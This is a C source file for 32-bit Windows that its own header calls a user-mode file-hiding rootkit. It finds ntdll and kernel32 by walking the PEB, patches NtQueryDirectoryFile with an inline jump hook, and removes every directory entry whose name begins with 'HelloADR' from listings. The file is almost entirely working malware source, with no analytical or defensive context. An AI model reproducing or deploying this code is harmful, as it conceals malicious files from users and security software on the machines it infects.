#include <winternl.h>
#include <windows.h>
#define JMP(from, to) (int)(((int)to - (int)from) - 5);

/********************************************************************************
	BASIC Function
	Without API To CheckOut Important Detail Of Memory.
********************************************************************************/
DWORD GetFuncAddr(HMODULE hModule, char* FuncName)
{
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = PIMAGE_EXPORT_DIRECTORY(pNtHeader->OptionalHeader.DataDirectory[0].VirtualAddress + (PBYTE)hModule);

	PDWORD pAddressName = PDWORD((PBYTE)hModule + pExportDirectory->AddressOfNames); 
	PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);
	PDWORD pAddresOfFunction = (PDWORD)((PBYTE)hModule + pExportDirectory->AddressOfFunctions);

	for (int index = 0; index < (pExportDirectory->NumberOfNames); index++)
	{
		char* pFunc = (char*)((long)hModule + *pAddressName);
		DWORD CurrentAddr = (DWORD)((PBYTE)hModule + pAddresOfFunction[*pAddressOfNameOrdinals]);

		if (!strcmp(pFunc, FuncName)) return (CurrentAddr);
		pAddressName++;
		pAddressOfNameOrdinals++;
	}
	return (NULL);
}
DWORD GetKernel32Mod()
{
	DWORD dRetn = 0;
	_asm{

		mov ebx, fs:[0x30] //PEB
			mov ebx, [ebx + 0x0c]//Ldr
			mov ebx, [ebx + 0x1c]//InInitializationOrderModuleList
		Search :
			   mov eax, [ebx + 0x08]//Point to Current Modual Base.
			   mov ecx, [ebx + 0x20]//Point to Current Name.
			   mov ecx, [ecx + 0x18]
			   cmp cl, 0x00//Test if Name[25] == \x00.
			   mov ebx, [ebx + 0x00]
			   jne Search
			   mov[dRetn], eax
	}
	return dRetn;
}
DWORD GetNTDllMod()
{
	DWORD dRetn = 0;
	_asm{
		mov ebx, fs:[0x30] //PEB
			mov ebx, [ebx + 0x0c]//Ldr
			mov ebx, [ebx + 0x1c]//InInitializationOrderModuleList
			mov eax, [ebx + 0x08]//Point to Current Modual Base.
			mov[dRetn], eax
	}
	return dRetn;
}
void SetMemExecuable(LPVOID Addr, DWORD Count)
{
	DWORD d;
	VirtualProtect(Addr, Count, PAGE_EXECUTE_READWRITE, &d);
}
void Jump(unsigned long ulAddress, void* Function, unsigned long ulNops)
{
	try {
		DWORD d, ds;
		VirtualProtect((LPVOID)ulAddress, 5, PAGE_EXECUTE_READWRITE, &d);
		*(unsigned char*)ulAddress = 0xE9;
		*(unsigned long*)(ulAddress + 1) = JMP(ulAddress, Function);
		memset((void*)(ulAddress + 5), 0x90, ulNops);
		VirtualProtect((LPVOID)ulAddress, 5, d, &ds);
	}
	catch (...) {}
}
void Memset(unsigned long ulAddress, void* AOB, unsigned long count)
{
	try {
		DWORD d, ds;
		VirtualProtect((LPVOID)ulAddress, count, PAGE_EXECUTE_READWRITE, &d);
		memcpy((void*)ulAddress, (void*)AOB, count);
		VirtualProtect((LPVOID)ulAddress, count, d, &ds);
	}
	catch (...) {}
}

/********************************************************************************
	File Hidden Rookit Ring3
	Hook NtQueryDirectoryFile API To Hide File.

	http://blog.airesoft.co.uk/code/fileid.cpp
	http://blog.csdn.net/liuhanlcj/article/details/43946629
	http://blog.csdn.net/xugangjava/article/details/17093741
********************************************************************************/

#define FileBothDirectoryInformation	 3 
#define FileIdBothDirectoryInformation	37
#define STATUS_NO_MORE_FILES	0x80000006

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;
BYTE NewNtQDFSpace[16];
WCHAR* HiddenPatten = L"HelloADR";

NTSTATUS(WINAPI*NormalNtQDFFunc)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
	);

NTSTATUS WINAPI ZwNewNtQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan)
{
	NTSTATUS ReturnContent = NormalNtQDFFunc(FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);

	if (!NT_SUCCESS(ReturnContent)) return ReturnContent;
	else if (IoStatusBlock->Information == 0) return ReturnContent;
	else if ((FileInformationClass != FileBothDirectoryInformation) &&
		(FileInformationClass != FileIdBothDirectoryInformation)) return ReturnContent;

	if (FileInformationClass == FileBothDirectoryInformation) {
		PFILE_BOTH_DIR_INFORMATION pHdr = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		PFILE_BOTH_DIR_INFORMATION pLast = NULL;
		BOOL bLastFlag = FALSE;
		do {
			bLastFlag = !(pHdr->NextEntryOffset);
			if (memcmp(pHdr->FileName, HiddenPatten, wcslen(HiddenPatten)) == 0) {
				if (bLastFlag) {
					if (!pLast) {
						return STATUS_NO_MORE_FILES;
					}
					pLast->NextEntryOffset = 0;
					break;
				}
				else {
					int iPos = ((ULONG)pHdr) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pHdr->NextEntryOffset;
					RtlCopyMemory((PVOID)pHdr, (PVOID)((char *)pHdr + pHdr->NextEntryOffset), (DWORD)iLeft);
					continue;
				}
			}
			pLast = pHdr;
			pHdr = (PFILE_BOTH_DIR_INFORMATION)((char *)pHdr + pHdr->NextEntryOffset);
		} while (!bLastFlag);
	}
	else {
		PFILE_ID_BOTH_DIR_INFORMATION pHdr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		PFILE_ID_BOTH_DIR_INFORMATION pLast = NULL;
		BOOL bLastFlag = FALSE;
		do {
			bLastFlag = !(pHdr->NextEntryOffset);
			if (memcmp(pHdr->FileName, HiddenPatten, wcslen(HiddenPatten)) == 0) {
				if (bLastFlag) {
					if (!pLast) {
						return STATUS_NO_MORE_FILES;
					}
					pLast->NextEntryOffset = 0;
					break;
				}
				else {
					int iPos = ((ULONG)pHdr) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pHdr->NextEntryOffset;
					RtlCopyMemory((PVOID)pHdr, (PVOID)((char *)pHdr + pHdr->NextEntryOffset), (DWORD)iLeft);
					continue;
				}
			}
			pLast = pHdr;
			pHdr = (PFILE_ID_BOTH_DIR_INFORMATION)((char *)pHdr + pHdr->NextEntryOffset);
		} while (!bLastFlag);
	}
	return ReturnContent;
}

void SetUpNtQDFHook()
{
	DWORD NtQDFAddr = (DWORD)GetProcAddress((HMODULE)GetNTDllMod(), "NtQueryDirectoryFile");
	memcpy(&NewNtQDFSpace, (void*)NtQDFAddr, 16);
	SetMemExecuable((LPVOID)NewNtQDFSpace, sizeof(NewNtQDFSpace));
	NormalNtQDFFunc = (NTSTATUS(WINAPI *)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN))(&NewNtQDFSpace);
	Jump(NtQDFAddr, ZwNewNtQueryDirectoryFile, 0);
}